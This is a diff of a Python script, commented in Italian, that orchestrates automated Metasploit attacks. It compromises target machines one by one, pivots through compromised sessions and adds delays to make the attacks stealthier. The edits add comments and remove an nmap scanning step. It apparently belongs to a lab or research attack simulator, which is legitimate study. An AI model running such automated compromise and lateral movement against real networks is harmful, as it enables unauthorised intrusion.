@@ -11,6 +11,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
 
     Logger.init_logger()
 
+    #Vengono estratte dal file di configurazione le informazioni sulle macchine target
     with open(config_file) as f:
         target_list = json.load(f)
     machines = []
@@ -26,18 +27,22 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
     compromised_machines = {attacker_ip}
     uncompromised_machines = set(machines)
 
+    #Viene inizializzato il client Metasploit e viene caricato il database
     mc = MetaClient("password", C.ATTACKER_SERVER_RPC_PORT, attacker_ip)
     attack_db = Attack_DB(mc, attacker_ip, OOBSession)
 
+
+    #CASO 0: PROCEDURA IN ORDINE CASUALE
     if not attack_sequence_file:
-        # Caso: Sequenza casuale
+        print("\n")
         print(f"{C.COL_GREEN}[+] No attack sequence file provided, proceeding with random attack sequence{C.COL_RESET}")
         
+        #Vengono estratte ed attaccate, una ad una, tutte le macchine target
         while machines:
             target_ip = machines.pop(0)
             print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
 
-            # Genera una sequenza casuale di attacchi
+            #Viene generata una sequenza casuale di attacchi per la macchina in esame
             attack_sequence_list = list(attack_db.attack_dict)
             attack_sequence_list = random.sample(attack_sequence_list, len(attack_sequence_list))
 
@@ -54,7 +59,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                     mc.route_add(met_sess["id_sess"], target_ip)
                     router = met_sess
 
-            # Scelta degli scan in base alla modalità stealth
+            """
             if stealth:
                 scans = list(attack_db.stealth_scans_dict)
             else:
@@ -68,9 +73,10 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                 nmap_target = target_ip
 
             scan_obj = attack_db.create_scan(s, nmap_target, attacker_ip)
-            print(f"{C.COL_YELLOW}[*] Scanning for vulnerabilities {C.COL_RESET}")
             mc.attempt_scan(scan_obj)
 
+            """
+            
             attack_sequence_index = 0
             while attack_sequence_index < len(attack_sequence_list):
                 attack_name = attack_sequence_list[attack_sequence_index]
@@ -97,7 +103,6 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                     if session[0] == target_ip:
                         atk_sess = session[1:2][0]["id_sess"]
                         print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
-                        print(f"{C.COL_GREEN}[+] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")
                         compromised_machines.add(target_ip)
                         uncompromised_machines.remove(target_ip)
 
@@ -130,7 +135,8 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                     print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
                     sleep(stealth_sleep)
 
-    # Caso con attack_sequence_file
+
+    #CASO 1: PROCEDURA CON ORDINE LETTO DA FILE
     else:
         with open(attack_sequence_file) as f:
             attack_data = json.load(f)['attack_sequence']
@@ -164,21 +170,6 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                     mc.route_add(met_sess["id_sess"], target_ip)
                     router = met_sess
 
-            if stealth:
-                scans = list(attack_db.stealth_scans_dict)
-            else:
-                scans = list(attack_db.scans_dict)
-
-            s = random.choice(scans)
-
-            if s != "tcp_portscan":
-                nmap_target = str(ipaddress.IPv4Network(target_ip + "/255.255.0.0", False)).replace("/16", "/24")
-            else:
-                nmap_target = target_ip
-
-            scan_obj = attack_db.create_scan(s, nmap_target, attacker_ip)
-            print(f"{C.COL_YELLOW}[*] Scanning for vulnerabilities {C.COL_RESET}")
-            mc.attempt_scan(scan_obj)
 
             LPORT = C.DEFAULT_LPORT
             for p in C.TARGETS_DOCKERS[target_ip]:
@@ -202,7 +193,6 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                     if session[0] == target_ip:
                         atk_sess = session[1:2][0]["id_sess"]
                         print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
-                        print(f"{C.COL_GREEN}[+] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")
                         compromised_machines.add(target_ip)
                         uncompromised_machines.remove(target_ip)
 
@@ -234,9 +224,10 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                 if stealth_sleep:
                     print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
                     sleep(stealth_sleep)
+
             print(f"{C.COL_GREEN}[+] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")
 
-            print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
+         
 
     print(f"{C.COL_GREEN} Attack complete!! {C.COL_RESET}")
 
